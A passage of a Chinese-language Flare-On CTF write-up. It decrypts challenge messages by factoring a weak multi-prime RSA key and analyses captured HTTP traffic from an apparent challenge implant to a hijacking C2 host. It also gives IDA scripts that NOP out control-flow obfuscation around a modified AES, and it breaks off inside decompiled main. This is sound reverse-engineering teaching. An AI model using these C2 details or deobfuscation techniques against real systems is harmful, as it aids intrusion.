class="punctuation">:</span> <span class="string">&quot;Yes, it&#x27;s on the blockchain.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3f6de0c2063d3e8e875737046fef079d73cc9b1b7a4b7b94da2d2867493f6fc5&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;conversation_time&quot;</span><span class="punctuation">:</span> <span class="number">24</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LCG-XOR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plaintext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Erm enable super safe mode&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;787cf6c0be39caa21b7908fcd1beca68031b7d11130005ba361c5d361b106b6d&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;conversation_time&quot;</span><span class="punctuation">:</span> <span class="number">30</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LCG-XOR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plaintext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ok, activating now&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;632ab61849140655e0ee6f90ab00b879a3a3da241d4b50bab99f74f169d456db&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;conversation_time&quot;</span><span class="punctuation">:</span> <span class="number">242</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plaintext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[ENCRYPTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;680a65364a498aa87cf17c934ab308b2aee0014aee5b0b7d289b5108677c7ad1eb3bcfbcad7582f87cb3f242391bea7e70e8c01f3ad53ac69488713daea76bb3a524bd2a4bbbc2cfb487477e9d91783f103bd6729b15a4ae99cb93f0db22a467ce12f8d56acaef5d1652c54f495db7bc88aa423bc1c2b60a6ecaede2f4273f6dce265f6c664ec583d7bd75d2fb849d77fa11d05de891b5a706eb103b7dbdb4e5a4a2e72445b61b83fd931cae34e5eaab931037db72ba14e41a70de94472e949ca3cf2135c2ccef0e9b6fa7dd3aaf29a946d165f6ca452466168c32c43c91f159928efb3624e56430b14a0728c52f2668ab26f837120d7af36baf48192ceb3002&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;conversation_time&quot;</span><span class="punctuation">:</span> <span class="number">249</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plaintext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[ENCRYPTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6f70034472ce115fc82a08560bd22f0e7f373e6ef27bca6e4c8f67fedf4031be23bf50311b4720fe74836b352b34c42db46341cac60298f2fa768f775a9c3da0c6705e0ce11d19b3cbdcf51309c22744e96a19576a8de0e1195f2dab21a3f1b0ef5086afcffa2e086e7738e5032cb5503df39e4bf4bdf620af7aa0f752dac942be50e7fec9a82b63f5c8faf07306e2a2e605bb93df09951c8ad46e5a2572e333484cae16be41929523c83c0d4ca317ef72ea9cde1d5630ebf6c244803d2dc1da0a1eefaafa82339bf0e6cf4bf41b1a2a90f7b2e25313a021eafa6234643acb9d5c9c22674d7bc793f1822743b48227a814a7a6604694296f33c2c59e743f4106&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>LCG使用主机名称生成，但无法猜测主机名称，查看公钥：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQAHqNys8GuPfBCUueYLClzq</span><br><span class="line">oNMGDpGWzr04InFmeDR6e/MDLsCVWU3xW/JnszG5L29yofjDqHPPYN08GX0qiZOg</span><br><span class="line">3tX38YkWR4CLAQ7P7JKzpo5/rNRE8XMtyDJmwiYbamM+QQsaiXCPaqiTpljTiIZb</span><br><span class="line">QnjS1AoKTzyAcuxrT2EJRHTKIOGPnG/k+r4ozVt4R++/X2sabmmjNAnbdRU0jEUJ</span><br><span class="line">LcQlupnOXraJyUUEBC+paDETEHcbWVtOCaWnaUcSq0ICr9ZrGwfkb7YNI8ZsyJh1</span><br><span class="line">AHNelaBhgQtXEYeF8pBIa718vXXNAB3hzpcLBUpRpUWHImWeWTV1nd9DoP6XQrGX</span><br><span class="line">AgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>

<p>直接解密后转hex：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">30820121300d06092a864886f70d01010105000382010e003082010902820100</span><br><span class="line">07a8dcacf06b8f7c1094b9e60b0a5ceaa0d3060e9196cebd3822716678347a7bf3032ec095594df15bf267b331b92f6f72a1f8c3a873cf60dd3c197d2a8993a0ded5f7f1891647808b010ecfec92b3a68e7facd444f1732dc83266c2261b6a633e410b1a89708f6aa893a658d388865b4278d2d40a0a4f3c8072ec6b4f61094474ca20e18f9c6fe4fabe28cd5b7847efbf5f6b1a6e69a33409db7515348c45092dc425ba99ce5eb689c94504042fa968311310771b595b4e09a5a7694712ab4202afd66b1b07e46fb60d23c66cc8987500735e95a061810b57118785f290486bbd7cbd75cd001de1ce970b054a51a5458722659e5935759ddf43a0fe9742b197</span><br><span class="line">0203</span><br><span class="line">010001</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">966937097264573110291784941768218419842912477944108020986104301819288091060794069566383434848927824136504758249488793818136949609024508201274193993592647664605167873625565993538947116786672017490835007254958179800254950175363547964901595712823487867396044588955498965634987478506533221719372965647518750091013794771623552680465087840964283333991984752785689973571490428494964532158115459786807928334870321963119069917206505787030170514779392407953156221948773236670005656855810322260623193397479565769347040107022055166737425082196480805591909580137453890567586730244300524109754079060045173072482324926779581706647</span></span><br></pre></td></tr></table></figure>

<p>n在factordb上已有分解记录：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line"><span class="number">62826068095404038148338678434404643116583820572865189787368764098892510936793</span> *</span><br><span class="line"><span class="number">68446593057460676025047989394445774862028837156496043637575024036696645401289</span> *</span><br><span class="line"><span class="number">69802783227378026511719332106789335301376047817734407431543841272855455052067</span> *</span><br><span class="line"><span class="number">72967016216206426977511399018380411256993151454761051136963936354667101207529</span> *</span><br><span class="line"><span class="number">75395288067150543091997907493708187002382230701390674177789205231462589994993</span> *</span><br><span class="line"><span class="number">79611551309049018061300429096903741339200167241148430095608259960783012192237</span> *</span><br><span class="line"><span class="number">82836473202091099900869551647600727408082364801577205107017971703263472445197</span> *</span><br><span class="line"><span class="number">88790251731800173019114073860734130032527125661685690883849562991870715928701</span></span><br></pre></td></tr></table></figure>

<p>直接解密即可：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">0x07a8dcacf06b8f7c1094b9e60b0a5ceaa0d3060e9196cebd3822716678347a7bf3032ec095594df15bf267b331b92f6f72a1f8c3a873cf60dd3c197d2a8993a0ded5f7f1891647808b010ecfec92b3a68e7facd444f1732dc83266c2261b6a633e410b1a89708f6aa893a658d388865b4278d2d40a0a4f3c8072ec6b4f61094474ca20e18f9c6fe4fabe28cd5b7847efbf5f6b1a6e69a33409db7515348c45092dc425ba99ce5eb689c94504042fa968311310771b595b4e09a5a7694712ab4202afd66b1b07e46fb60d23c66cc8987500735e95a061810b57118785f290486bbd7cbd75cd001de1ce970b054a51a5458722659e5935759ddf43a0fe9742b197</span></span><br><span class="line">c1 = bytes_to_long(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;680a65364a498aa87cf17c934ab308b2aee0014aee5b0b7d289b5108677c7ad1eb3bcfbcad7582f87cb3f242391bea7e70e8c01f3ad53ac69488713daea76bb3a524bd2a4bbbc2cfb487477e9d91783f103bd6729b15a4ae99cb93f0db22a467ce12f8d56acaef5d1652c54f495db7bc88aa423bc1c2b60a6ecaede2f4273f6dce265f6c664ec583d7bd75d2fb849d77fa11d05de891b5a706eb103b7dbdb4e5a4a2e72445b61b83fd931cae34e5eaab931037db72ba14e41a70de94472e949ca3cf2135c2ccef0e9b6fa7dd3aaf29a946d165f6ca452466168c32c43c91f159928efb3624e56430b14a0728c52f2668ab26f837120d7af36baf48192ceb3002&quot;</span>)[::-<span class="number">1</span>])</span><br><span class="line">c2 = bytes_to_long(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;6f70034472ce115fc82a08560bd22f0e7f373e6ef27bca6e4c8f67fedf4031be23bf50311b4720fe74836b352b34c42db46341cac60298f2fa768f775a9c3da0c6705e0ce11d19b3cbdcf51309c22744e96a19576a8de0e1195f2dab21a3f1b0ef5086afcffa2e086e7738e5032cb5503df39e4bf4bdf620af7aa0f752dac942be50e7fec9a82b63f5c8faf07306e2a2e605bb93df09951c8ad46e5a2572e333484cae16be41929523c83c0d4ca317ef72ea9cde1d5630ebf6c244803d2dc1da0a1eefaafa82339bf0e6cf4bf41b1a2a90f7b2e25313a021eafa6234643acb9d5c9c22674d7bc793f1822743b48227a814a7a6604694296f33c2c59e743f4106&quot;</span>)[::-<span class="number">1</span>])</span><br><span class="line">p = [<span class="number">62826068095404038148338678434404643116583820572865189787368764098892510936793</span>,</span><br><span class="line">     <span class="number">68446593057460676025047989394445774862028837156496043637575024036696645401289</span>,</span><br><span class="line">     <span class="number">69802783227378026511719332106789335301376047817734407431543841272855455052067</span>,</span><br><span class="line">     <span class="number">72967016216206426977511399018380411256993151454761051136963936354667101207529</span>,</span><br><span class="line">     <span class="number">75395288067150543091997907493708187002382230701390674177789205231462589994993</span>,</span><br><span class="line">     <span class="number">79611551309049018061300429096903741339200167241148430095608259960783012192237</span>,</span><br><span class="line">     <span class="number">82836473202091099900869551647600727408082364801577205107017971703263472445197</span>,</span><br><span class="line">     <span class="number">88790251731800173019114073860734130032527125661685690883849562991870715928701</span>]</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phin = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)): phin *= (p[i]-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phin)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c1, d, n)), long_to_bytes(<span class="built_in">pow</span>(c2, d, n)))</span><br></pre></td></tr></table></figure>

<p><font color=deepskyblue><strong><a href="mailto:&#x57;&#x33;&#x62;&#x33;&#95;&#105;&#53;&#95;&#71;&#114;&#56;&#64;&#102;&#108;&#97;&#114;&#x65;&#45;&#111;&#x6e;&#46;&#99;&#111;&#x6d;">W3b3_i5_Gr8@flare-on.com</a></strong></font></p>
<h1 id="7-The-Boss-Needs-Help"><a href="#7-The-Boss-Needs-Help" class="headerlink" title="#7 The Boss Needs Help"></a>#7 The Boss Needs Help</h1><h2 id="初始分析"><a href="#初始分析" class="headerlink" title="初始分析"></a>初始分析</h2><p>程序主要函数均被加上混淆，分析流量包，发现格式主要有以下几种：</p>
<p>192.168.56.103：第一次是Bearer在<font color=lime><strong>twelve.flare-on.com:8000</strong></font>上发送GET请求，之后被一个奇怪的Host <font color=red><strong>theannualtraditionofstaringatdisassemblyforweeks.torealizetheflagwasjustxoredwiththefilenamethewholetime.com:8080</strong></font>劫持，如果有额外消息会被加密后用json格式传递</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /good HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Avocado OS; 1-Core Toaster) AppleWebKit/537.36 (XML, like Gecko) FLARE/1.0</span><br><span class="line">Authorization: Bearer e4b8058f06f7061e8f0f8ed15d23865ba2427b23a695d9b27bc308a26d</span><br><span class="line">Accept-Encoding: </span><br><span class="line">Connection: close</span><br><span class="line">Accept: */*</span><br><span class="line">Host: twelve.flare-on.com:8000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /get HTTP/1.1</span><br><span class="line">Accept-Encoding: </span><br><span class="line">Connection: close</span><br><span class="line">Accept: */*</span><br><span class="line">Host: theannualtraditionofstaringatdisassemblyforweeks.torealizetheflagwasjustxoredwiththefilenamethewholetime.com:8080</span><br><span class="line">User-Agent: rustc-hyper/0.25.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: </span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 341</span><br><span class="line">Accept: */*</span><br><span class="line">Host: theannualtraditionofstaringatdisassemblyforweeks.torealizetheflagwasjustxoredwiththefilenamethewholetime.com:8080</span><br><span class="line">User-Agent: rustc-hyper/0.25.0</span><br><span class="line"></span><br><span class="line">&#123;&quot;d&quot;:&quot;密文&quot;,&quot;msg&quot;:&quot;sysi&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>192.168.56.117：接受get和post请求，也按密文发送</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Server: SimpleHTTP/0.6 Python/3.10.11</span><br><span class="line">Date: Wed, 20 Aug 2025 06:12:07 GMT</span><br><span class="line">Content-type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;d&quot;: &quot;密文&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>流量包中有一个518KB的hex消息，猜测是某种文件，此外劫持的host名称意为“每年的惯例都是往往花了几周逆向结果发现flag只是和文件名xor了一下而已”，可能是某种提示</p>
<p>程序中数据段有SHA-256的常量表和AES的S盒&#x2F;逆S盒，其中AES的S盒、逆S盒在两个AES-256-CBC加密&#x2F;解密函数 <font color=violet><strong>0x7FF6B5C70D20 0x7FF6B5C70DC0</strong></font> 中使用（基地址<font color=red><strong>0x7FF6B5C20000</strong></font>），且这个函数被两个混淆函数 <font color=violet><strong>0x7FF6B5CF3E60 0x7FF6B5D57960</strong></font> 所调用，猜测为关键逻辑</p>
<h2 id="反混淆"><a href="#反混淆" class="headerlink" title="反混淆"></a>反混淆</h2><p>方法一：提高反编译阈值，强制反编译</p>
<p>此方法可以反编译main函数，对于所有能够反编译出来的函数，使用arg追踪法：</p>
<p><font color=orange><strong>如果一个函数有参数，那么统计每个参数被xref到的行，从最小的行开始，只统计过程中遇到的有关变量，无关变量不做统计。</strong></font></p>
<p>注意到地址<font color=violet><strong>0x7FF6B608A540</strong></font>的位置的AES逆S盒有一个被混淆的xref：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_7FF6B5C78A00</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a3; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">            v10 = a1[i] ^ <span class="number">0x5A</span>;</span><br><span class="line">            v15 = i + <span class="number">1</span> + v10;</span><br><span class="line">            a2[i] = AES_INV_SBOX_[v15];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法二：尝试解混淆</p>
<p>此处可以看出来是一个魔改AES，在S盒替换的步骤有着额外的异或操作，观察汇编发现，似乎只有rax、rcx、rdx大量参与了控制流混淆过程，r8、r9、r10似乎也参与了，nop前后函数体不变，编写脚本nop所有相关汇编指令（不包含call）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">START_EA = <span class="number">0x7FF6B5C78A42</span></span><br><span class="line">END_EA   = <span class="number">0x7FF6B5C7E952</span></span><br><span class="line"></span><br><span class="line">TARGET_REGS = &#123;</span><br><span class="line">    <span class="string">&#x27;r11&#x27;</span>, <span class="string">&#x27;r11d&#x27;</span>, <span class="string">&#x27;r11w&#x27;</span>, <span class="string">&#x27;r11b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r12&#x27;</span>, <span class="string">&#x27;r12d&#x27;</span>, <span class="string">&#x27;r12w&#x27;</span>, <span class="string">&#x27;r12b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r13&#x27;</span>, <span class="string">&#x27;r13d&#x27;</span>, <span class="string">&#x27;r13w&#x27;</span>, <span class="string">&#x27;r13b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r14&#x27;</span>, <span class="string">&#x27;r14d&#x27;</span>, <span class="string">&#x27;r14w&#x27;</span>, <span class="string">&#x27;r14b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r15&#x27;</span>, <span class="string">&#x27;r15d&#x27;</span>, <span class="string">&#x27;r15w&#x27;</span>, <span class="string">&#x27;r15b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;rbx&#x27;</span>, <span class="string">&#x27;ebx&#x27;</span>, <span class="string">&#x27;bx&#x27;</span>, <span class="string">&#x27;bl&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;rsi&#x27;</span>, <span class="string">&#x27;esi&#x27;</span>, <span class="string">&#x27;si&#x27;</span>, <span class="string">&#x27;sil&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;rdi&#x27;</span>, <span class="string">&#x27;edi&#x27;</span>, <span class="string">&#x27;dil&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_preserve</span>(<span class="params">ea</span>):</span><br><span class="line">    disasm = idc.GetDisasm(ea)</span><br><span class="line">    <span class="keyword">if</span> disasm <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> disasm == <span class="string">&quot;???&quot;</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    disasm_lower = disasm.lower().strip()</span><br><span class="line">    <span class="keyword">if</span> disasm_lower.startswith(<span class="string">&#x27;call&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> reg <span class="keyword">in</span> TARGET_REGS:</span><br><span class="line">        <span class="keyword">if</span> reg <span class="keyword">in</span> disasm_lower: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop_range</span>(<span class="params">start_ea, end_ea</span>):</span><br><span class="line">    ea = start_ea</span><br><span class="line">    <span class="keyword">while</span> ea &lt; end_ea:</span><br><span class="line">        insn_len = idc.get_item_size(ea)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> should_preserve(ea):</span><br><span class="line">            nop_bytes = <span class="string">b&quot;\x90&quot;</span> * insn_len</span><br><span class="line">            idaapi.patch_bytes(ea, nop_bytes)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;NOPed instruction at <span class="subst">&#123;ea:#x&#125;</span> (len=<span class="subst">&#123;insn_len&#125;</span>)&quot;</span>)</span><br><span class="line">        ea += insn_len</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Processing range: [<span class="subst">&#123;START_EA:#x&#125;</span>, <span class="subst">&#123;END_EA:#x&#125;</span>)&quot;</span>)</span><br><span class="line">    nop_range(START_EA, END_EA)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>该脚本只能对一条链（一个case）使用，否则会破坏跳转，分析更大的函数（如main）发现关键逻辑均不会受到混淆部分代码影响，因此可以直接nop整个范围，对main使用该脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">START_EA = [<span class="number">0x7FF6B5E2BA33</span>, <span class="number">0x7FF6B5E30EF2</span>, <span class="number">0x7FF6B5E33B92</span>, <span class="number">0x7FF6B5E39279</span>, <span class="number">0x7FF6B5E3BF02</span>, <span class="number">0x7FF6B5E3E7C8</span>, <span class="number">0x7FF6B5E41180</span>]</span><br><span class="line">END_EA   = [<span class="number">0x7FF6B5E30EB6</span>, <span class="number">0x7FF6B5E33AEE</span>, <span class="number">0x7FF6B5E3920D</span>, <span class="number">0x7FF6B5E3BE7C</span>, <span class="number">0x7FF6B5E3E783</span>, <span class="number">0x7FF6B5E41158</span>, <span class="number">0x7FF6B5E46476</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop_range</span>(<span class="params">start_ea, end_ea</span>):</span><br><span class="line">    ea = start_ea</span><br><span class="line">    <span class="keyword">while</span> ea &lt; end_ea:</span><br><span class="line">        insn_len = idc.get_item_size(ea)</span><br><span class="line">        nop_bytes = <span class="string">b&quot;\x90&quot;</span> * insn_len</span><br><span class="line">        idaapi.patch_bytes(ea, nop_bytes)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;NOPed instruction at <span class="subst">&#123;ea:#x&#125;</span> (len=<span class="subst">&#123;insn_len&#125;</span>)&quot;</span>)</span><br><span class="line">        ea += insn_len</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(START_EA)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Processing range: [<span class="subst">&#123;START_EA[i]:#x&#125;</span>, <span class="subst">&#123;END_EA[i]:#x&#125;</span>)&quot;</span>)</span><br><span class="line">        nop_range(START_EA[i], END_EA[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>之后反编译发现main中还有一个<font color=lime><strong>try…catch</strong></font>块<font color=violet><strong>0x7FF6B60829A4</strong></font>，把这块也处理一下（<font color=violet><strong>0x7FF6B60829B1 ~ 0x7FF6B6084EC4</strong></font>，成功解混淆main，且依然可以调试：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset_w</span>(v37, <span class="number">320</span>, envp);</span><br><span class="line">  <span class="built_in">sub_7FF6B5C4E020</span>(v37, p_); <span class="comment">//获取用户名</span></span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)<span class="built_in">BigFunc1</span>((__int64)v37) ) <span class="comment">//某个校验</span></span><br><span class="line">  &#123;</span><br><span class="line">    v29[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v28 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span 